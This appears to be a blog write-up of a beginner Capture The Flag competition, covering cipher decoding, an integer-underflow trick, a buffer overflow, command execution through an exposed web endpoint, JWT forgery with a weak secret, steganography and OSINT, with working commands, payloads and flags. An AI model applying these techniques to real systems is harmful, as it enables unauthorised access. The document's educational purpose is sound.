---
layout: post
title: "Portuguese Cybersecurity Competition CTF Write-up"
categories: [security]
tags: [security,ctf,hackrocks,hacking]
thumbnail: /images/hackrocks22/20221112112111.png
description: "Write-up of the Portuguese Cybersecurity Competition CTF by InvestAmarante and hackrocks."
---

Some weeeks ago I've participated in the "Portuguese Cybersecurity Competition" organized by [InvestAmarante](https://investamarante.com/) and powered by [hackrocks](https://hackrocks.com/). Given that this was a begginer friendly (maybe too friendly...) Capture The Flag competition there were no major learning takeways, but it is always useful to pratice some old tricks and tools (*and do some over-engineering... as always*). 

<!--more-->

The ~~worst~~ less good part of the CTF was that the challenges categories did not match the challenges content, and seemed purely random.

I also want to give kudos [mluis](https://github.com/mluis/) for the company as he also participated in the CTF, making things more fun! So let's get to the write-up!

## Strange Email

>The text of the mail is as follows:
>
>Good morning! I would like to order, please, a T-shirt with the following image printed on it, since I am a big fan of computers...  
>
>_000 111 0000 100 0001 0000 / 101 0000 111 000 / 0100 / 100 0110 / 10 0100 110 1101 100 000 000 0000 110 / 0100 1101 / 010 000 010 001 011 010_
>
>Strange... that string doesn't seem to make any sense in binary. However, if it is a help message, it is obvious that your messages could be monitored and therefore you must hide the real message somehow?  
>
>Can you help us find the young man being held??

So this was a cryto / obfuscation challenge. While I've lost more time than I'm proud to admit solving this challenge, this is pretty trivial if you consider that (1) the bits sequences do not follow any standard, i.e., no multiple of two, and (2) the separator `/` gives it away. Nonetheless, my first attempt was to use [quipqiup](https://www.quipqiup.com/) to solve it without any luck. Next I followed the *overengineering* path and attempt to solve it using a [Bacon's cypher](https://en.wikipedia.org/wiki/Bacon%27s_cipher) without any luck. 

I've solved other challenges in the meanwhile, and given that this was the welcoming challenge, it cannot be that hard. Looking back at the visible *hints*, if we replace: `0 -> .` and `1 -> -`  we discover a plain old Morse message, that can be easy decoded using [CyberChef](https://gchq.github.io/CyberChef/) or any other tool

However the resulting letters does not making any sense... Maybe a little rotation solves the problem? ROT13 gave no results, but ROT23 (!?) worked perfectly!

![](/images/hackrocks22/20221130173856.png)

And the flag is `OPORTO`.

## Veracruz

>Here you have the **Found files.zip**. Your mission will be to analyze these files and find out if there's something wrong... Let's go!

This was the trickiest one. Three files were inside the `files.zip` archive:
- `contenedor.pdf`: ~~what I tought to be~~ a corrupted PDF file. Using all the tricks to recover the file to a readable format didn't succed. `binwalk` also wasn't able to extract anything from the file.
- `README.txt`: a TXT file with the following text: `Hi there, This PDF is the receipt for the encryptor we bought in Saimazoon.`
- `algarve.jpg`: A random photo. Using all the `steg` tools (props to [Aperi'solve](aperisolve.fr/)) to extract information from the image did not provide anything.
- `portugal1.jpg`: Similar to the previous random picture, there was nothing within it.

After spending some time messing around with it, and talking with *mluis*, he suggested that it could be related with [Veracrypt](https://www.veracrypt.fr/code/VeraCrypt/) (the challenge title says it all now...). So, assuming that the corrupted PDF file was the *vault*, the keys must lie amongst the remaining files.

After finding out that you can use files as partial keys to the vault, and with some trial and error, we found out that the `algarve.jpg` was the keyfile, and the password string was extracted from the `README.txt` file, being the location of the hypothetical delivery site, `Saimazoon`. 

This would give access to a text file with the flag, `SLINKWOIRU`.

## Shopper

>Connect to the service, called **shopper**, and try to exploit it:
>
>**challenges.hackrocks.com:42421**
>**NOTE**: No other ports are part of this challenge.

Finally, a shell/service to play with! Connecting using `telnet`:
```bash
❯ telnet challenges.hackrocks.com 42421
Trying 95.216.99.248...
Connected to challenges.hackrocks.com.
Escape character is '^]'.
1. buy chocolate $1
2. buy token $100
your money $10
choose: 
```

So we have a system that lets us buy chocolates for 1$! So messing around with the input must give us something. Attempting to simply crash the service with large values or strings did not give it away immediatilly.

Once again, `mluis` suggested using `MAX` values, e.g. `MAX_INT` or `MIN_INT` given the inputs are always numeric. Doing that trick, giving the `MIN_INT` as input to option `1` (`-2147483648`), we can have MAX MONEY:
```bash
1. buy chocolate $1
2. buy token $100
your money $10
choose: 1
how much> -2147483648
1. buy chocolate $1
2. buy token $100
your money $2147483658
choose: 2
the token is: flag{n3gativ3_input_and_m0re_money}
```

And we get the flag: `flag{n3gativ3_input_and_m0re_money}`.

## Ovlo

>You will find the service at the following host:
>**challenges.hackrocks.com:37881**
>
>Ready? Then don't waste your time and go ahead!  
>**NOTE**: No other ports are part of this challenge.

This challenge, once again, gives us a shell to play with, as well as the C source code of the service running in port 37881.

So, connecting to it:
```bash
❯ telnet challenges.hackrocks.com 37881
Trying 95.216.99.248...
Connected to challenges.hackrocks.com.
Escape character is '^]'.
vent anything to me
```
So we are given an "infinite" input box, `vent anything to me`. Without even looking at the sauce, we can enter a lot of `a` to see what happens!
```bash
vent anything to me
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
the flag is flag{m0r3_th4n_72_n1ce!}

Connection closed by foreign host.
```

Ah! Just a plain trivial buffer overflow, and we got the flag, `flag{m0r3_th4n_72_n1ce!}`.

`mluis` did spend some time looking at the binary source code, and found out that there is an signal handler for `SIGSEGV` that prints the flag if any part of the code does an *illegally access or modify memory*, typically caused by *uninitialized or NULL pointer values or by memory overlays*.

## Hidden In the Web

>Set up your toolkit, and get ready to start the audit...
>
>To access the challenge, click on the following link: [http://example.com:10101](http://example.com:10101)

![[Screenshot 2022-12-01 at 12-35-41 Hidden In the Web - hackrocks.png]

So, this time we get a web challenge with greet us with a _under construction_ page. Looking at the source code of the page we get an obvious hint:

```html
<!-- 
Hey Marcus, dont forget to change the permission of environment. thanks!
Sincerely, Adrian
 -->
```

So _Marcus_ must change the permissions to some file. Let's get a dir buster running. But, let's start by the simpliest scan, open [OWASP Zap](https://owasp.org/www-project-zap/) and do a default automatic scan give us an exposed sensitive file, `.env`. The content of that file was juicy, as expected:

```bash
❯ curl 'http://example.com:10101/.env'
PATH=/s3cr3t_3ntr4nce.php
CMD=c0mm
METHOD=GET
```

So we have a path, `s3cr3t_3ntr4nce.php` that gives us command execution! Let's mess around a litte in the folder directory:

```bash
❯ curl 'http://example.com:10101/s3cr3t_3ntr4nce.php?c0mm=ls%20%2F..'
bin
boot
dev
etc
flag.txt
home
lib
...
```

Oh! An obvious `flag.txt` file! 

```bash
❯ curl 'http://example.com:10101/s3cr3t_3ntr4nce.php?c0mm=cat%20%2Fflag.txt'
flag{m4rcus_f0rg0t_t0_change_perm_env_and_igot_shell}
```

Printing the contents, we get our flag, `flag{m4rcus_f0rg0t_t0_change_perm_env_and_igot_shell}`

## Talkies Talk

>We just know that the person is named **James**, and a **Picture** of the last place he was. Can you find him?

<center>
<img style="max-width: 50%;" alt="Place" src="/images/hackrocks22/20221112112111.png"/>
</center>

So this was an OSINT challenge. The first part of the challenge was pretty straightforward, just finding the place were the picture was taken, you can use Google Images, or Yandex Image search to get to the result directly.

![](/images/hackrocks22/20221112112504.png)

So, we have KOPI 98 cafe located in _Jl. Boulevard Graha Raya No.30, Paku Jaya, Kec. Serpong Utara, Kota Tangerang Selatan, Banten 15220, Indonesia_. But where to go from here now?

After losing some hair trying to understand where to go from here, `mluis` suggested to look into the reviews, and we found the flag.

![](/images/hackrocks22/20221112112442.png)
> Author: Jameskenniyantopurica
> Nice coffee  
> flag{n0needToreverseImag3me!}

Flag was `flag{n0needToreverseImag3me!}`.

## Bad Cookie

>Access the website provided to us and help us rewrite the report.  
>To access the challenge, click on the following link: [http://example.com:17821](http://example.com:17821)

![](/images/hackrocks22/20221201124047.png)

So another web challenge. This was also a pretty straightforward challenge, but I didn't look at the source code, so I took the longest road possible. But let's get to the details. We have a web page with 3 sub pages, `Home`, `Admin`, and `Message`. Trying to access the `Admin` page gives us an alert message: `no cookie!`. So we have to get a cookie.

Getting to the `Message` page, we have an input box for our `name`. Entering anything in this field gives us a cookie that set the field `x-access-token`. 

![](/images/hackrocks22/20221201124137.png)

However, if we try to access the `Admin` we still don't have the necessary cookie. Looking at the cookie we can see that it is a `jwt` token:
`x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJndWVzdCIsImlkIjoidGVzdCIsImV4cCI6MTY2OTkwMDI3NX0.G-MCKnN3jluboyrxXCHDCU2TF8CfZWVXnyUc3HP4QfQ`

Using [jwt.io](https://jwt.io/) we can see the fields of the cookie which is signed with `HMACSHA256`:

```json
{
    "public_id": "guest",
    "id": "test",
    "exp": 1669900275
}
```

So we can see that our `public_id` is `guest`, and, most probably, we need to be `admin` to access the `Admin` page. So, trying to understand the most common attacks to `jwt` I found out a tool, [JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool#the-json-web-token-toolkit-v2), that, after configuring the target URL and specifying our `jwt` as input, automatically attempts to find issues with it, as it quickly found out that the key using to sign the token was `12345` by merely bruteforce with the built-in dictionary. However, as aforementioned, this was an unnecessary effort, given that as a commentary in the source code we had the following message: 

```html
<!-- 
putting jwt beautifier in here soon!
DEBUG note for QA:
the current jwt secret is 12345
-->
```

Oh well. Using the same tool also aids us on generating a new `jwt` with any modifications we need:

```bash
❯ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJndWVzdCIsImlkIjoidGVzdCIsImV4cCI6MTY2ODI1NTkxOH0.QKE7Vlzxr_-BzOmFhPnYPjw9cuVYJjsrNatDRSBikyc -T -S hs256 -p "12345"

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] public_id = "guest"
[2] id = "test"
[3] exp = 1668255918    ==> TIMESTAMP = 2022-11-12 12:25:18 (UTC)
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of public_id is: guest
Please enter new value and hit ENTER
> admin
[1] public_id = "admin"
[2] id = "test"
[3] exp = 1668255918    ==> TIMESTAMP = 2022-11-12 12:25:18 (UTC)
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_98c7e8bf492b3d9160ae70364245e1b8 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJhZG1pbiIsImlkIjoidGVzdCIsImV4cCI6MTY2ODI1NTkxOH0.T3aPtPlGJ8FDt_K3z0-57yOHNdoWyJ3bAERbIJd4KWQ
```

Trying to access the `admin` page with the crafted `x-access-token` reveals the flag: `flag{wh0a_y0u_g0t_m3_g00d_thr0ugh_jwt}` 

## Distant Sounds

> Just an **Audio file**. At the moment, we don't have much information for you, only that it has somehow been involved in the latest attack by a known cybercriminal gang.

So another steg/crypto challenge with an `sounds.wav` file.  Listing to the audio it is obviously Morse code, so using [Morse Code Adaptive Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) we get the message `SAYFRIENDANDCOMEIN`. But this was not the flag.

<center>
<img style="max-width: 60%;" alt="morse decoder" src="/images/hackrocks22/20221112120006.png"/>
</center>

In this part I've wasted too much time looking at this as a reference to Lord of the Rings when _Gandalf_ tries to enter Moria by the Western Gate, given that the challenge was similar:

> "It reads 'The Doors of Durin — Lord of Moria. Speak, friend, and enter.'" -- Gandalf

 But using the movie referenced word “mellon” as the flag, _the Sindarin word for “friend”_, did not work.

One thing that I noticed is that the audio was really sloooww, so maybe there was more to the file than meets the ear. Attempting `binwalk` provided nothing new. However, one other tool that is commonly used to hide files in `wav` sound files is `steghide`. 

Doing `steghide extract –sf sounds.wav` prompt us to enter a password, and using as password the word `friend` gave us a `secret.txt` file.

```bash
❯ cat secret.txt
Greetings! Youve found the flag for this game: IWHIOPDNJI
```

So the flag is `IWHIOPDNJI`.
## Talkies Talk II

> The **GCP** indicates that it has managed to find out that _maigret_ should be used, because James would never send a picture without hidden information.

We get an image and nothing more. I've wasted too much time also on this challenge because I missed to notice the obvious, but oh well. After attempting all the usual stegnography tricks, no luck. Even the output of `exiftool` did not provide any useful info, or at least, that was what I though. After `mluis` suggestion to look closer to the output of `exiftool` it became obvious that there was an author in the picture metadata, `0xdc9`. As the username was hexadecimal it passed by me as purely gibberish, but it was not.

Using `maigret` or, more knownly, `sherlock`, both tools to find usernames in social networks, would quickly lead us to a Twitter account with only one post:

<center>
<img style="max-width: 80%;" alt="leak image" src="/images/hackrocks22/20221201204640.png"/>
</center>

And we get our last flag: `flag{well_i_am_exposed_through_one_pic}`

## Wrap-up

So this was the first CTF by InvestAmarante, and the first one that I played from _hackrocks_. As a newbie friendly CTF it was quick to solve (even quicker if I did not so much time into _rabbit holes_). A recommendation for _hackrocks_ is to be more realistic/precise about the categories, and try to stick to the common ones that typically apply. And, at last, I managed to finish in the 11<sup>th</sup> position.

![](/images/hackrocks22/20221206232957.png)

